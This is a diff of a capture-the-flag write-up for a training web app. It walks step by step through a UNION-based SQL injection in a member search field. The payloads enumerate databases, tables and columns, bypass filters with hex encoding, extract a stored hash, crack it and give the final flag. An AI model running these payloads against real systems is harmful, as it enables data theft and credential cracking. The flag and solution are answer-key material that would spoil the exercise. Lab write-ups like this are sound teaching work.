@@ -2,29 +2,49 @@
 
 ## Sql Injection
 
-### Flag
+## Flag
 
-### How to find it
+```
+10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+```
 
-- On the Members section, there is a field in order to search for a member giving the id. This fields is directly vulnerable to a sql injection. We can try a UNION Based sql insection in order to get information about the webserver, for example if we type: 
+### How to find the flag
 
-`1 union select 1,version()`
+1. **Identifying SQL Injection Vulnerability**:
     
-    We can get information about the host: 
+    In the Members section, there is a field to search for a member by ID. This field is directly vulnerable to SQL injection. We can use a UNION-based SQL injection to retrieve information about the web-server. For example, by entering:
     
-    `5.5.64-MariaDB-1ubuntu0.14.04.1`
-    If we want information about the database that it is using we should type:
+    ```sql
+    1 union select 1, version()
+    ```
     
-    `1 union select database(),user()` 
+    We get information about the host version:
+    
+    ```
+    5.5.64-MariaDB-1ubuntu0.14.04.1
+    ```
+    
+2. **Retrieving Database information:**
+    
+    In order to obtain the database currentyly in use, we can type:
+    
+    ```sql
+    1 union select database(), user()
+    ```
     
     Output:
-    `Member_Sql_Injection`
     
-    Knowing that this field is vulnerable to sql injection we can get all the databases inside this webserver using: 
+    ```
+    Member_Sql_Injection
+    ```
     
-    `1 union select schema_name, 2 from information_schema.schemata`
+    Knowing this field is vulnerable, we can enumerate all databases on the webserver using:
     
-    This will give us:
+    ```sql
+    1 union select schema_name, 2 from information_schema.schemata
+    ```
+    
+    This query reveals:
     
     - information_schema
     - Member_Brute_Force
@@ -32,3 +52,53 @@
     - Member_guestbook
     - Member_images
     - Member_survey
+3. **Retrieving Tables in a Database**:
+    
+    Next, we can list tables within the **Member_Sql_Injection** database using:
+    
+    ```sql
+    1 union select table_name, 2 from information_schema.tables where table_schema=database()
+    ```
+    
+    The use of `database()` is necessary to avoid syntax errors. The output shows a table named "**users**."
+    
+4. **Finding Columns in the “users” table:**
+    
+    We can view columns within the "users" table by using:
+    
+    ```sql
+    1 union select column_name, 2 from information_schema.columns where table_name=0x7573657273
+    ```
+    
+    Here, we converted "users" to hexadecimal (0x7573657273) to bypass potential SQL injection filters.
+    
+5. **Extracting data:**
+    
+    Now that we know the columns in the "users" table, we see a column named "**Commentaire**." To view its content, we use:
+    
+    ```sql
+    1 UNION SELECT Commentaire, 2 FROM users
+    ```
+    
+    In the results, we see a message saying:
+    
+    ```
+    "Decrypt this password -> then lower all the char…"
+    ```
+    
+    Checking all columns in "users," we also find a "**countersign**" column containing a hash. Combining **Commentaire** and **countersign** with the following query:
+    
+    ```sql
+    1 UNION SELECT Commentaire, countersign FROM users
+    ```
+    
+    We obtain:
+    
+    ```
+    First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good!
+    Surname: 5ff9d0165b4f92b14994e5c685cdce28
+    ```
+    
+6. Decrypting the Hash:
+    
+    Using an MD5 decrypter, we decrypt this hash to reveal: **FortyTwo**. By converting it to lowercase and hashing it with SHA-256, we obtain the final flag.
